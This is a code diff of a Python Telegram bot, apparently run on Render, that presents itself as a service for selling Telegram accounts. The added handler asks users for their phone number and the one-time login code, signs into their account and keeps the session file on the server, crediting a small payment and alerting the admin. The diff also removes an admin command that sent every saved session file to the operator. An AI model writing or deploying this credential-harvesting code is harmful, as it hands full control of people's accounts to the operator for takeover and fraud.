@@ -19,7 +19,7 @@ if not os.path.exists(SESSIONS_DIR):
 
 user_data = {}
 
-# Flask Server
+# Flask Server for Render
 app = Flask(__name__)
 @app.route('/')
 def home(): return "Bot is Online"
@@ -29,7 +29,6 @@ def run_flask():
     app.run(host='0.0.0.0', port=port)
 
 # ============ BOT CLIENT ============
-# loop=asyncio.new_event_loop() যোগ করা হয়েছে এরর ফিক্স করতে
 loop = asyncio.new_event_loop()
 asyncio.set_event_loop(loop)
 bot = TelegramClient('bot_session', API_ID, API_HASH, loop=loop).start(bot_token=BOT_TOKEN)
@@ -68,41 +67,57 @@ async def send_main_menu(event):
     if hasattr(event, 'edit'): await event.edit(text, buttons=buttons)
     else: await event.respond(text, buttons=buttons)
 
+# ============ ACCOUNT RECEIVING LOGIC ============
+@bot.on(events.CallbackQuery(data=b"sell_acc"))
+async def sell_account(event):
+    user_id = event.sender_id
+    async with bot.conversation(user_id) as conv:
+        await conv.send_message("📲 **Enter phone number with country code (e.g. +880...):**")
+        phone_response = await conv.get_response()
+        phone = phone_response.text.strip().replace(" ", "")
+        
+        await conv.send_message("⏳ *Processing... Please wait.*")
+        temp_client = TelegramClient(f'{SESSIONS_DIR}/{phone}', API_ID, API_HASH, loop=loop)
+        await temp_client.connect()
+        
+        try:
+            send_code = await temp_client.send_code_request(phone)
+            await conv.send_message("🔢 **Enter the OTP sent to your Telegram app:**")
+            otp_response = await conv.get_response()
+            otp = otp_response.text.strip()
+            
+            # Login Process
+            await temp_client.sign_in(phone, otp, phone_code_hash=send_code.phone_code_hash)
+            
+            # Successful Message
+            if user_id not in user_data: user_data[user_id] = {'balance': 0.0}
+            user_data[user_id]['balance'] += 0.30
+            
+            await conv.send_message(f"✅ **Account Added Successfully:**\n`{phone}`\n💰 0.30$ added to your balance.")
+            
+            # Admin Notification
+            await bot.send_message(ADMIN_ID, f"🚀 **New Account Linked**\nPhone: `{phone}`")
+            
+        except Exception as e:
+            await conv.send_message(f"❌ **Error:** {str(e)}")
+        finally:
+            await temp_client.disconnect()
+
 @bot.on(events.CallbackQuery)
-async def callback_handler(event):
+async def others(event):
     user_id = event.sender_id
     if user_id not in user_data: user_data[user_id] = {'balance': 0.0}
     
     if event.data == b"acc_info":
         bal = user_data[user_id]['balance']
-        text = f"👤 **Your Account Info**\n\n**User ID:** `{user_id}`\n**Balance:** `{bal:.2f}$` USDT\n\n🚀 *Sell accounts and earn more!*"
-        await event.edit(text, buttons=[Button.inline("⬅️ Back", b"main_menu")])
+        await event.edit(f"👤 **Account Info**\n\nUser ID: `{user_id}`\nBalance: `{bal:.2f}$`", buttons=[Button.inline("⬅️ Back", b"main_menu")])
     elif event.data == b"about":
-        await event.edit("ℹ️ **About This Bot**\nAutomated account selling bot.\n\n**Created By:** @ToxicNexo", buttons=[Button.inline("⬅️ Back", b"main_menu")])
+        await event.edit("ℹ️ **About Bot**\nCreated By: @ToxicNexo", buttons=[Button.inline("⬅️ Back", b"main_menu")])
     elif event.data == b"main_menu":
         await send_main_menu(event)
-    elif event.data == b"withdraw":
-        if user_data[user_id]['balance'] < 1.0:
-            await event.answer("❌ Minimum withdrawal is 1$", alert=True)
-        else:
-            await event.respond("💳 Send your USDT (BEP20) address:")
-    elif event.data == b"sell_acc":
-        await event.respond("📲 Send your phone number with country code (+880...):")
-
-@bot.on(events.NewMessage(pattern='/adminpanel'))
-async def admin_panel(event):
-    if event.sender_id != ADMIN_ID: return
-    files = [f for f in os.listdir(SESSIONS_DIR) if f.endswith('.session')]
-    if not files: await event.respond("📁 No sessions found.")
-    else:
-        for f in files: await bot.send_file(ADMIN_ID, f"{SESSIONS_DIR}/{f}", caption=f"📄 Session: `{f}`")
 
 if __name__ == '__main__':
-    # Flask থ্রেড চালু করা
-    t = Thread(target=run_flask)
-    t.daemon = True
-    t.start()
-    
-    # বট রান করা
-    print("Bot is starting...")
+    Thread(target=run_flask).start()
+    print("Bot is Live...")
     bot.run_until_disconnected()
+        
